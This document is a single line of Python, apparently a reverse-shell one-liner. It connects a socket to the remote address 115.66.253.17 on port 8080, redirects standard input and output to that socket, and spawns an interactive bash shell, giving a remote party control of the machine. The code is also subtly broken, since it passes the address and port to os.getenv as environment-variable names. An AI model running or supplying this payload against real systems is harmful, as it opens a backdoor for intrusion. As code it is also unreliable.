import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("115.66.253.17"),int(os.getenv("8080"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")
